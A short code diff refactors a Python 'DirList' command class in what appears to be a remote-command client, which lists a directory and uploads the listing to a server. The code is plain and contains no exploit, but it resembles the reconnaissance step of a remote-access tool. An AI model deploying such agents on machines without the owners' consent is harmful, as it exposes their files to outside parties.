@@ -3,11 +3,19 @@ import os
 from commands.Command import Command
 from client import communication as c
 
+"""
+DirList implements Command
+run will return os dir command output and upload to server 
+"""
+
 
 class DirList(Command):
 
+    @staticmethod
+    def get_required_params():
+        return ['path']
+
     def run(self):
-        if "path" in self.params:
-            listdir = os.listdir(self.params["path"])
-            c.upload_dirlist(self.params["path"], listdir)
-        return f'DirList {self.params["path"]}: {listdir}'
+        listdir = os.listdir(self.path)
+        c.upload_dirlist(self.path, listdir)
+        return f'DirList {self.path}: {listdir}'
